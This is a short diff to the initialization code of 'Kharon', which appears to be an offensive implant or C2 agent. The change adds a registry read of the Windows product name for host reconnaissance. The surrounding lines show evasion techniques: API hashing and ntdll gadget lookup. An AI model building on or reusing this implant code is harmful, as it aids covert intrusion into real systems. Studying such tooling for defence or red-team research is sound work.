@@ -211,6 +211,7 @@ auto DECLFN Kharon::Init(
 
     /* ========= [ informations collection ] ========= */
     CHAR   cProcessorName[MAX_PATH] = { 0 };
+    CHAR   cProductType[MAX_PATH] = { 0 };
 
     BOOL   IsWow64      = FALSE;
     ULONG  TmpVal       = 0;
@@ -221,6 +222,8 @@ auto DECLFN Kharon::Init(
 
     ULONG  ProcBufferSize    = sizeof( cProcessorName );
     PCHAR  cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
+    ULONG  ProductTypeBufferSize = sizeof( cProductType );
+    PCHAR  cProductTypeReg = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
 
     SYSTEM_INFO     SysInfo   = { 0 };
     MEMORYSTATUSEX  MemInfoEx = { 0 };
@@ -318,6 +321,19 @@ auto DECLFN Kharon::Init(
     this->Machine.ProcessorName = (PCHAR)this->Hp->Alloc( ProcBufferSize );
     Mem::Copy( this->Machine.ProcessorName, cProcessorName, ProcBufferSize );
     
+    this->Advapi32.RegOpenKeyA(
+        HKEY_LOCAL_MACHINE, cProductTypeReg,
+        0, KEY_READ, &KeyHandle
+    );
+    
+    this->Advapi32.RegQueryValueExA(
+        KeyHandle, "ProductName", nullptr, nullptr,
+        B_PTR( cProductType ), &ProductTypeBufferSize
+    );
+
+    this->Machine.ProductType = (PCHAR)this->Hp->Alloc( ProductTypeBufferSize );
+    Mem::Copy( this->Machine.ProductType, cProductType, ProductTypeBufferSize );
+
     this->Mk->Ctx.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
     this->Mk->Ctx.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
 
